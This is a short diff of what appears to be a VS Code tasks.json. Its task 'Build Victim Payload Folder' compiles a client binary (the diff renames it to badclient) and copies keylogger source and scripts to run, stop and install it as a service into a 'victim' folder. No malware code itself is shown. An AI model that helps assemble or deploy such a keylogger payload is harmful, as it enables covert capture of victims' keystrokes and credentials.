@@ -15,7 +15,7 @@
         {
             "label": "Build Victim Payload Folder",
             "type": "shell",
-            "command": "mkdir -p victim && gcc client.c -o victim/client -lcrypto && cp Makefile keylogger.c klrun.sh klstop.sh klservice.sh victim/ && chmod +x victim/klrun.sh victim/klstop.sh victim/klservice.sh",
+            "command": "mkdir -p victim && gcc badclient.c -o victim/badclient -lcrypto && cp Makefile keylogger.c klrun.sh klstop.sh klservice.sh victim/ && chmod +x victim/klrun.sh victim/klstop.sh victim/klservice.sh",
             "group": "build",
             "presentation": {
                 "reveal": "always",
